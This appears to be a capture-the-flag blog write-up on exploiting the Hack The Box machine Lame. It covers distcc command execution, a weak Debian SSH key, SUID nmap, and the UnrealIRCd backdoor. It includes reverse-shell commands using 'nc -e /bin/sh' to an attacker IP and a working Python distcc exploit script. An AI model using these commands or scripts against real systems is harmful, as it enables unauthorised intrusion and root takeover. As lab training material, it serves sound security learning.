---
title: HTB: More Lame
url: https://0xdf.gitlab.io/2020/04/08/htb-lame-more.html
date: 2020-04-08T10:00:00+00:00
tags: hackthebox, htb-lame, ctf, nmap, distcc, searchsploit, cve-2004-2687, cve-2008-0166, ssh, rsa, suid, gtfobins, wireshark, python, oscp-like, htb-irked
---

![](https://0xdfimages.gitlab.io/img/lame-more-cover.png)

After I put out a Lame write-up yesterday, it was pointed out that I skipped an access path entirely - distcc. Yet another vulnerable service on this box, which, unlike the Samba exploit, provides a shell as a user, providing the opportunity to look for PrivEsc paths. This box is so old, I’m sure there are a ton of kernel exploits available. I’ll skip those for now focusing on ~~two~~ three paths to root - finding a weak public SSH key, using SUID nmap, and backdoored UnrealIRCd.

## distcc - TCP 3632

### Standard nmap Scan

`nmap` run in the way I usually run it doesn’t give much info about dist-cc:

```

root@kali# nmap -p 3632 -sV -sC 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 14:23 EDT
Nmap scan report for 10.10.10.3
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds

```

### Background

From the [gentoo wiki](https://wiki.gentoo.org/wiki/Distcc/en):

> [Distcc](https://github.com/distcc/distcc) is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, **distccd**, and a client program, **distcc**. Distcc can work transparently with [ccache](http://ccache.samba.org), [Portage](https://wiki.gentoo.org/wiki/Portage), and Automake with a small amount of setup.

The idea is networked compilation of code. Also in that same page, in the Configuration section, it recommends configuring which clients are allowed to connect, as:

![image-20200408065033615](https://0xdfimages.gitlab.io/img/image-20200408065033615.png)

### Exploits

`searchsploit` shows an exploit for command execution against the distcc daemon:

```

root@kali# searchsploit distcc
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
DistCC Daemon - Command Execution (Metasploit)                | exploits/multiple/remote/9915.rb
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

This isn’t as much an exploit as it is taking advantage of what is called out on the Gentoo wiki - part of the system design is such that if you can connect to distcc, you can run commands.

This result is a Metasploit script. Goolging shows some ties to CVE-2004-2687, but pulling up the [documentation on that CVE](https://nvd.nist.gov/vuln/detail/CVE-2004-2687), it’s exactly what I saw above:

> distcc 2.x, as used in XCode 1.5 and others, when not configured to restrict access to the server port, allows remote attackers to execute arbitrary commands via compilation jobs, which are executed by the server without authorization checks.

### nmap Script

Searching on the CVE leads to not only the Metasploit exploit, but also [this nmap script](https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse). It’s not a script included with `nmap` by default, but I can download it and store it in my scripts directory. `locate` is useful to find where the scripts are stored:

```

root@kali# locate *.nse | head
/usr/share/exploitdb/exploits/hardware/webapps/31527.nse
/usr/share/exploitdb/exploits/multiple/remote/33310.nse
/usr/share/legion/scripts/nmap/shodan-api.nse
/usr/share/legion/scripts/nmap/shodan-hq.nse
/usr/share/legion/scripts/nmap/vulners.nse
/usr/share/nmap/scripts/acarsd-info.nse
/usr/share/nmap/scripts/address-info.nse
/usr/share/nmap/scripts/afp-brute.nse
/usr/share/nmap/scripts/afp-ls.nse
/usr/share/nmap/scripts/afp-path-vuln.nse

```

I’ll download it into `/usr/share/nmap/scripts/`:

```

root@kali# wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
--2020-04-07 14:38:26--  https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
Resolving svn.nmap.org (svn.nmap.org)... 45.33.49.119, 2600:3c01::f03c:91ff:fe98:ff4e
Connecting to svn.nmap.org (svn.nmap.org)|45.33.49.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3519 (3.4K) [text/plain]
Saving to: ‘/usr/share/nmap/scripts/distcc-exec.nse’

/usr/share/nmap/scripts/distcc-exec.nse    100%[=======================================================================================>]   3.44K  --.-KB/s    in 0s      

2020-04-07 14:38:27 (54.8 MB/s) - ‘/usr/share/nmap/scripts/distcc-exec.nse’ saved [3519/3519]

```

Now I can run it and get results:

```

root@kali# nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 14:38 EDT
Nmap scan report for 10.10.10.3
Host is up (0.014s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-exec: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

I’ll play with this execution in more depth in [Beyond Root](#beyond-root---distcc-exploit).

## Shell as daemon

The script above actually already showed command execution, running and returning the results from the `id` command. I can see the process is running as daemon.

To get a shell, I’ll just start a `nc` listener, and change that command from `id` to `nc`:

```

root@kali# nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.24 443'"
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 14:41 EDT
Nmap scan report for 10.10.10.3
Host is up (0.013s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 30.48 seconds

```

Instantly I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:57188.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```

I’ll upgrade it with `python -c 'import pty;pty.spawn("bash")'`, ctrl-z, `stty raw -echo`, `fg`, `reset`, and have a proper shell. I can grab `user.txt`:

```

daemon@lame:/home/makis$ cat user.txt
69454a93************************

```

## Shell as root

There are multiple paths to root. I won’t show kernel exploits, though I suspect there are a bunch (udev seems promising).

### Weak SSH Key

The permissions on `/root` are open to make it world readable:

```

daemon@lame:/$ ls -ld root/
drwxr-xr-x 13 root root 4096 Apr  7 10:33 root/

```

I can’t read `root.txt`, but I can read into the `.ssh` directory:

```

daemon@lame:/root$ ls -la
total 80
drwxr-xr-x 13 root root 4096 Apr  7 10:33 .
drwxr-xr-x 21 root root 4096 May 20  2012 ..
-rw-------  1 root root  373 Apr  7 10:33 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Apr  7 10:33 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Apr  7 10:33 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Mar 14  2017 root.txt
-rw-r--r--  1 root root  118 Apr  7 10:33 vnc.log

```

In there, I find the public keys file, `authorized_keys`:

```

daemon@lame:/root/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable

```

Typically having a public key doesn’t do much, but two things are interesting here:
- Why is the user msfadmin@metasploitable?
- Could this key be vulnerable to CVE-2008-0166, where the random number generator in OpenSSL broke for a period of time causing lots of thing, including some SSH keys, to be brute forcable from the public key.

I’ll clone [g0tmi1k’s GitHub repo](https://github.com/g0tmi1k/debian-ssh) for this vulnerability, and go into that directory, and unpack the common RSA keys:

```

root@kali:/opt# git clone https://github.com/g0tmi1k/debian-ssh
Cloning into 'debian-ssh'...
remote: Enumerating objects: 35, done.
remote: Total 35 (delta 0), reused 0 (delta 0), pack-reused 35
Unpacking objects: 100% (35/35), 439.59 MiB | 6.72 MiB/s, done.
root@kali:/opt# cd debian-ssh/
root@kali:/opt/debian-ssh# ls
common_keys  our_tools  README.md  uncommon_keys
root@kali:/opt/debian-ssh# cd common_keys/
root@kali:/opt/debian-ssh/common_keys# ls
debian_ssh_dsa_1024_x86.tar.bz2  debian_ssh_rsa_2048_x86.tar.bz2
root@kali:/opt/debian-ssh/common_keys# tar jxf debian_ssh_rsa_2048_x86.tar.bz2

```

Now I’ll use `grep` with `-lr` for recurrsive to just display the filename with the public key, and it finds it:

```

root@kali:/opt/debian-ssh/common_keys/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub
57c3115d77c56390332dc5c49978627a-5429.pub

```

I can use the matching private key to SSH to the box as root:

```

root@kali:/opt/debian-ssh/common_keys/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
Last login: Tue Apr  7 10:33:18 2020 from :0.0
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
id
root@lame:~# id
uid=0(root) gid=0(root) groups=0(root)

```

### SUID nmap

#### Enumeration

I can look for SUID files with the following `find` command (LinEnum or linPEAS would also find them):

```

daemon@lame:/$ find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2>/dev/null -ls
 16466   68 -rwsr-xr-x   1 root     root        63584 Apr 14  2008 /bin/umount
 16449   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount
 16398   28 -rwsr-xr-x   1 root     root        25540 Apr  2  2008 /bin/su
 16418   84 -rwsr-xr-x   1 root     root        81368 Apr 14  2008 /bin/mount
 16427   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping
 16457   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6
  8370   68 -rwsr-xr-x   1 root     root        65520 Dec  2  2008 /sbin/mount.nfs
  8252   20 -rwxr-sr-x   1 root     shadow      19584 Apr  9  2008 /sbin/unix_chkpwd
304747    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudoedit
345080    4 -rwxr-sr-x   1 root     utmp         3192 Apr 22  2008 /usr/bin/Eterm
344440    8 -rwsr-sr-x   1 root     root         7460 Jun 25  2008 /usr/bin/X
344089    8 -rwxr-sr-x   1 root     tty          8192 Dec 12  2007 /usr/bin/bsd-write
344958   12 -rwsr-xr-x   1 root     root         8524 Nov 22  2007 /usr/bin/netkit-rsh
344366   80 -rwxr-sr-x   1 root     ssh         76580 Apr  6  2008 /usr/bin/ssh-agent
344139   40 -rwsr-xr-x   1 root     root        37360 Apr  2  2008 /usr/bin/gpasswd
344689   32 -rwxr-sr-x   1 root     mlocate     30508 Mar  8  2008 /usr/bin/mlocate
344364   28 -rwxr-sr-x   1 root     crontab     26928 Apr  8  2008 /usr/bin/crontab
344317   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils
344359  112 -rwsr-xr-x   2 root     root       107776 Feb 25  2008 /usr/bin/sudo
344959   12 -rwsr-xr-x   1 root     root        12020 Nov 22  2007 /usr/bin/netkit-rlogin
344550   40 -rwxr-sr-x   1 root     shadow      37904 Apr  2  2008 /usr/bin/chage
344284  308 -rwxr-sr-x   1 root     utmp       308228 Oct 23  2007 /usr/bin/screen
344220   20 -rwxr-sr-x   1 root     shadow      16424 Apr  2  2008 /usr/bin/expiry
344230   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping
345067  304 -rwxr-sr-x   1 root     utmp       306996 Jan  2  2009 /usr/bin/xterm
344365   20 -rwsr-xr-x   1 root     root        19144 Apr  2  2008 /usr/bin/newgrp
344337   12 -rwxr-sr-x   1 root     tty          9960 Apr 14  2008 /usr/bin/wall
344429   28 -rwsr-xr-x   1 root     root        28624 Apr  2  2008 /usr/bin/chfn
344956  768 -rwsr-xr-x   1 root     root       780676 Apr  8  2008 /usr/bin/nmap
344441   24 -rwsr-xr-x   1 root     root        23952 Apr  2  2008 /usr/bin/chsh
344957   16 -rwsr-xr-x   1 root     root        15952 Nov 22  2007 /usr/bin/netkit-rcp
344771   32 -rwsr-xr-x   1 root     root        29104 Apr  2  2008 /usr/bin/passwd
344792   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr
354594   12 -r-xr-sr-x   1 root     postdrop    10312 Apr 18  2008 /usr/sbin/postqueue
354659   12 -r-xr-sr-x   1 root     postdrop    10036 Apr 18  2008 /usr/sbin/postdrop
354626  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd
369987    8 -rwsr-xr--   1 root     telnetd      6040 Dec 17  2006 /usr/lib/telnetlogin
385106   12 -rwsr-xr--   1 root     www-data    10276 Mar  9  2010 /usr/lib/apache2/suexec
386116    8 -rwsr-xr-x   1 root     root         4524 Nov  5  2007 /usr/lib/eject/dmcrypt-get-device
377149  168 -rwsr-xr-x   1 root     root       165748 Apr  6  2008 /usr/lib/openssh/ssh-keysign
371390   12 -rwsr-xr-x   1 root     root         9624 Aug 17  2009 /usr/lib/pt_chown

```

I could research each of them, but I know from experience the `nmap` is useful to me.

#### GTFObins

To research a SUID or `sudo` binary, my first stop is always [GTFObins](https://gtfobins.github.io/). `nmap` is in there:

![image-20200407150606186](https://0xdfimages.gitlab.io/img/image-20200407150606186.png)

Clicking on the nmap link, it two ways to get a shell out of `nmap`:

![image-20200407150723364](https://0xdfimages.gitlab.io/img/image-20200407150723364.png)

#### Shell

The second work works great here (note the `euid` of root):

```

daemon@lame:/$ nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)

```

### Backdoored UnrealIRCd

Edited to add: [\_r518](https://twitter.com/_r518) pointed out another local privesc, UnrealIRCd. Given that this seems to be the Metasploitable VM, there’s probably even more, but I figured I’d add at least this one.

#### Enumeration

If I run a `netstat` on the box to see listening services, there are a bunch, but 6697 jumps out as IRC over SSL:

```

daemon@lame:/tmp$ netstat -tnlp                                                                                                                     
(Not all processes could be identified, non-owned process info                                                                                      
 will not be shown, you would have to be root to see it all.)                                                                                       
Active Internet connections (only servers)                                                                                                          Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                    tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:44007           0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:55758           0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      -                                
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      -                                
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 10.10.10.3:53           0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:40471           0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -                                                                   tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -                                                                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                                                                   
tcp6       0      0 :::2121                 :::*                    LISTEN      -                                                                   
tcp6       0      0 :::3632                 :::*                    LISTEN      -                                                                   
tcp6       0      0 :::53                   :::*                    LISTEN      -                                                                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                                                                   
tcp6       0      0 :::5432                 :::*                    LISTEN      -                                                                   
tcp6       0      0 ::1:953                 :::*                    LISTEN      - 

```

Also, the process list shows `unrealircd` running as root :

```

daemon@lame:/tmp$ ps auxww                                                                                                                                                                                                           
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                                                                                             
root         1  1.3  0.3   2844  1692 ?        Ss   15:26   0:00 /sbin/init                                                                                                                                                          
root         2  0.0  0.0      0     0 ?        S<   15:26   0:00 [kthreadd]
...[snip]...
root      5203  0.0  0.4   8540  2356 ?        S    15:27   0:00 /usr/bin/unrealircd 
...[snip]

```

On trying to connect to this port, I get output that identifies this as from Metasploitable:

```

daemon@lame:/tmp$ nc 127.0.0.1 6697
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ERROR :Closing Link: [127.0.0.1] (Ping timeout)

```

That suggests it’s likely the vulnerable version.

#### Exploit

I exploited this version of IRC in [Irked](/2019/04/27/htb-irked.html), and even wrote my own script to exploit it. However, it was Python3, and this box doesn’t have Python3. Rather than back-port it, I can use a one-liner from my shell:

```

daemon@lame:/tmp$ echo "AB; nc -e /bin/sh 10.10.14.24 443" | nc 127.0.0.1 6697
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead

```

And in a `nc` listener, get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:49683.
id
uid=0(root) gid=0(root)

```

## Beyond Root - distcc Exploit

To see what was happening, I started Wireshark and ran the distcc `nmap` exploit again. There’s some pinging, and a few test TCP streams, before the payload shows up in TCP stream 3:

![image-20200407151950507](https://0xdfimages.gitlab.io/img/image-20200407151950507.png)

I can see both the exploit and the response in there.

To test, I tried pasting that same string into `nc`. It worked, returning the output of `id`:

```

root@kali# nc 10.10.10.3 3632
DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV0000000csh -c '(id)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI00000001A
DONE00000001STAT00000000SERR00000000SOUT0000002duid=1(daemon) gid=1(daemon) groups=1(daemon)
DOTO00000000Ncat: Connection reset by peer.

```

I tried changing the command, and it just hung:

```

root@kali# nc 10.10.10.3 3632
DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV0000000csh -c '(whoami)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI00000001A

```

Looking back at the `nmap` script, I see this block in the middle:

```

  local cmds = {
    "DIST00000001",
    ("ARGC00000008ARGV00000002shARGV00000002-cARGV%08.8xsh -c " ..
    "'(%s)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002" ..
    "-oARGV00000006main.o"):format(10 + #arg_cmd, arg_cmd),
    "DOTI00000001A\n",
  }

```

There are two things filled in. First, 8 hex digits of the length of the command + 10 (I’m guessin the 10 being `sh -c '(` and `')`.) Then the command.

I wrote a quick Python script to exploit this:

```

#!/usr/bin/env python3

import socket
import sys

if len(sys.argv) != 4:
    print(f"{sys.argv[0]} [ip] [port] [command]")
    sys.exit(1)
_, ip, port, cmd = sys.argv
mask = "0xdffdx0"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
full_cmd = f"sh -c '(echo -n {mask};{cmd};echo -n {mask})'"
payload = f"""DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV{len(full_cmd):8x}{full_cmd}ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-               oARGV00000006main.oDOTI00000001A"""
s.send(payload.encode())
resp = s.recv(4096)
print(resp.decode(errors="ignore").split(mask)[1].strip())

```

The script is very simple. It gets an IP, port, and command from arguments. Then it creates the payload string using the input command. Looking at the results coming back, I want a reliable way to pull out the command output. It looks like it may always start the same number of bytes in, but to be sure, I’ll have the command `echo` a unique mask before and after the input command, and then use that to split and find the output.

It runs and returns results:

```

root@kali# ./distcc_exec.py 10.10.10.3 3632 'id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)

root@kali# ./distcc_exec.py 10.10.10.3 3632 'ls /home/'
ftp
makis
service
user

```

[« Lame FTP and SMB](/2020/04/07/htb-lame.html)